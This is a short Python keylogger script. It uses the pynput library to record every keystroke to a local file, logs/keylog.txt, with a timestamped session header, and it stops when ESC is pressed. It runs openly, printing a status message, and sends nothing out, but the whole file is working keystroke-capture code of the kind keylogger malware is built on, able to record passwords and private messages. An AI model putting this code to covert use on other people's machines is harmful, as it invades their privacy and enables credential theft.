from pynput import keyboard
from datetime import datetime
import os

# Create log folder if it doesn't exist
os.makedirs("logs", exist_ok=True)
log_file = "logs/keylog.txt"

# Write warning header
with open(log_file, "a") as f:
    f.write("\n\n--- New Session Started at {} ---\n".format(datetime.now()))

# Function to format keys
def format_key(key):
    try:
        return key.char
    except AttributeError:
        if key == keyboard.Key.space:
            return " [SPACE] "
        elif key == keyboard.Key.enter:
            return "\n[ENTER] "
        elif key == keyboard.Key.esc:
            return " [ESC] "
        else:
            return f" [{key.name.upper()}] "

# Callback on key press
def on_press(key):
    with open(log_file, "a") as f:
        f.write(format_key(key))

    # Exit the keylogger if ESC is pressed
    if key == keyboard.Key.esc:
        print("\n❌ ESC detected. Keylogger stopped.")
        return False

# Start the listener
print("🔴 Keylogger running... (Press ESC to stop)")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
